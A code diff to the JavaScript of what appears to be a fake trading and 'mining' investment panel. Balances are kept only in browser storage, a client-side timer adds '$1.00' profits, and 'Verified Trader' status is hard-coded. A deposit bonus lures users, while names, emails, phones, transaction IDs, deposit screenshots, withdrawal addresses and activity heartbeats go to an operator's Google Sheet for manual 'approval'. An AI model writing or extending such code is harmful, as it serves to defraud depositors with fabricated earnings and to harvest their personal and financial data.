@@ -560,7 +560,7 @@
 </head>
 <body>
 
-<!-- Top Yellow Running Ticker with Welcome Line -->
+<!-- Top Yellow Running Ticker -->
 <div class="top-ticker">
     <div class="ticker-text">🔥 WELCOME TO SMART STACK PANEL | 🚀 SPECIAL OFFER: DEPOSIT $200 AND GET AN INSTANT $5 BONUS IMMEDIATELY! LIMITED TIME OFFER! 🚀</div>
 </div>
@@ -695,7 +695,7 @@
 </div>
 
 <script>
-    // 1. Google Sheets Web App Endpoint - MAKE SURE TO USE YOUR LATEST VERSION URL HERE
+    // 1. Google Sheets Web App Endpoint
     const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbwkGl3ha8tMXPqyjg2P-73Qt1SyOkBpBzMc_J9IxfWp_8MsEzxXrMERGzZIuqcTdFVG/exec";
 
     function sendToGoogleSheet(name, email, phone, action, amount = "-", txid = "-", screenshot = "No SS", status = "Pending") {
@@ -707,7 +707,37 @@
         });
     }
 
-    // Live Activity Heartbeat (Active / Offline Tracking in Sheet)
+    // 2-Way Approval & Balance Polling Check
+    async function checkApprovalStatus() {
+        if (!currentUser) return;
+        try {
+            const res = await fetch(`${GOOGLE_SCRIPT_URL}?email=${encodeURIComponent(currentUser.email)}&phone=${encodeURIComponent(currentUser.phone)}`);
+            const data = await res.json();
+            if (data && data.result === 'success') {
+                if (data.status === 'Approved' && data.depositAmount > 0) {
+                    let currentDep = parseFloat(localStorage.getItem('depositBal')) || 0;
+                    if (currentDep !== data.depositAmount) {
+                        localStorage.setItem('depositBal', data.depositAmount.toFixed(2));
+                        let curr = parseFloat(localStorage.getItem('currentBal')) || 0;
+                        if (curr === 0) {
+                            localStorage.setItem('currentBal', data.depositAmount.toFixed(2));
+                            localStorage.setItem('equityBal', data.depositAmount.toFixed(2));
+                        }
+                        localStorage.removeItem('depositPending');
+                        const depBtn = document.getElementById('deposit-btn');
+                        if (depBtn) {
+                            depBtn.innerText = "Add Funds";
+                            depBtn.style.background = "#059669";
+                        }
+                        loadSavedBalances();
+                    }
+                }
+            }
+        } catch(e) {}
+    }
+    setInterval(checkApprovalStatus, 10000); // Live poll every 10 seconds
+
+    // Live Activity Heartbeat
     let isHeartbeatRunning = false;
     function sendHeartbeat(isActive) {
         if (currentUser && !isHeartbeatRunning) {
@@ -719,17 +749,12 @@
                 isActive ? "HEARTBEAT_ACTIVE" : "HEARTBEAT_OFFLINE",
                 "-", "-", "No SS", "Verified"
             );
-            setTimeout(() => { isHeartbeatRunning = false; }, 2000); // Prevent spam
+            setTimeout(() => { isHeartbeatRunning = false; }, 2000);
         }
     }
 
-    // Trigger Heartbeat on visibility change
     window.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'visible') {
-            sendHeartbeat(true);
-        } else {
-            sendHeartbeat(false);
-        }
+        sendHeartbeat(document.visibilityState === 'visible');
     });
     window.addEventListener('beforeunload', () => sendHeartbeat(false));
 
@@ -746,7 +771,7 @@
         container.appendChild(star);
     }
 
-    // 3. User Authentication with Strict Validations
+    // 3. User Authentication
     let currentUser = JSON.parse(localStorage.getItem('traderUser')) || null;
 
     function checkAuth() {
@@ -759,6 +784,7 @@
             checkDepositStatus();
             sendHeartbeat(true);
             checkMandatoryTerms();
+            checkApprovalStatus();
         } else {
             document.getElementById('auth-screen').style.display = 'block';
             document.getElementById('main-dashboard').style.display = 'none';
@@ -812,7 +838,7 @@
             localStorage.setItem('registeredUsersList', JSON.stringify(registeredUsers));
         }
 
-        sendToGoogleSheet(fname + " " + lname, email, phone, "SIGNUP", "$0.00", "-", "No SS", "Verified");
+        sendToGoogleSheet(fname + " " + lname, email, phone, "SIGNUP", "$0.00", "-", "No SS", "Pending");
 
         document.getElementById('auth-screen').style.display = 'none';
         const syncOverlay = document.getElementById('sync-overlay');
@@ -836,7 +862,7 @@
         }, 1000);
     }
 
-    // 4. Mandatory Terms & Self-Liability Risk Popup Engine
+    // 4. Mandatory Terms Popup
     function checkMandatoryTerms() {
         const termsDismissed = localStorage.getItem('smartStackTermsDismissed');
         if (termsDismissed === 'true') return;
@@ -901,7 +927,7 @@
                 <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#94a3b8;">Full Name:</span><span style="color:#fff; font-weight:bold;">${currentUser.fname} ${currentUser.lname}</span></div>
                 <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#94a3b8;">Email:</span><span style="color:#fff; font-weight:bold;">${currentUser.email}</span></div>
                 <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#94a3b8;">Phone:</span><span style="color:#fff; font-weight:bold;">${currentUser.phone}</span></div>
-                <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#94a3b8;">Status:</span><span style="color:#10b981; font-weight:bold;">Verified Trader</span></div>
+                <div style="display:flex; justify-content:space-between; border-bottom:1px solid #334155; padding:6px 0;"><span style="color:#10b981; font-weight:bold;">Verified Trader</span></div>
             </div>
             <button class="btn" onclick="handleLogout()" style="background:#dc2626; margin-top:15px; margin-bottom:0;">Sign Out</button>
         `;
@@ -1007,6 +1033,7 @@
         const file = fileInput.files[0];
         const reader = new FileReader();
         reader.onload = function(e) {
+            const base64Screenshot = e.target.result;
             if (currentUser) {
                 sendToGoogleSheet(
                     currentUser.fname + " " + currentUser.lname,
@@ -1015,7 +1042,7 @@
                     "DEPOSIT_PROOF_SUBMITTED",
                     "$" + amount.toFixed(2),
                     txid,
-                    "Verified",
+                    base64Screenshot,
                     "Pending Approval"
                 );
             }
@@ -1031,7 +1058,7 @@
         reader.readAsDataURL(file);
     }
 
-    // 6. Withdrawal Logic ($100 Cycle Check)
+    // 6. Withdrawal Logic
     function handleWithdrawalClick() {
         let currentDeposit = parseFloat(localStorage.getItem('depositBal')) || 0.00;
         let currentAmount = parseFloat(localStorage.getItem('currentBal')) || 0.00;
@@ -1081,7 +1108,7 @@
                 "$" + amt.toFixed(2),
                 addr,
                 "Withdrawal",
-                "Verified"
+                "Pending Approval"
             );
         }
 
@@ -1162,7 +1189,7 @@
         document.getElementById('val-withdrawal').innerText = "$" + withdrawalBal.toFixed(2);
     }
 
-    // 9. Market Rates Engine (Live Feeds)
+    // 9. Market Rates Engine
     let currentPair = 'GOLD';
     let livePrices = { GOLD: 4203.00, SILVER: 29.45, SP500: 5540.20 };
 
@@ -1361,7 +1388,7 @@
                 localStorage.setItem('userMiningHistory', JSON.stringify(historyLogs));
 
                 if (currentUser) {
-                    sendToGoogleSheet(currentUser.fname + " " + currentUser.lname, currentUser.email, currentUser.phone, "MINING_PROFIT", "$1.00", "-", "No SS", "Verified");
+                    sendToGoogleSheet(currentUser.fname + " " + currentUser.lname, currentUser.email, currentUser.phone, "MINING_PROFIT", "$1.00", "-", "No SS", "Approved");
                 }
 
                 let currentBal = (parseFloat(localStorage.getItem('currentBal')) || 0.00) + 1.0;
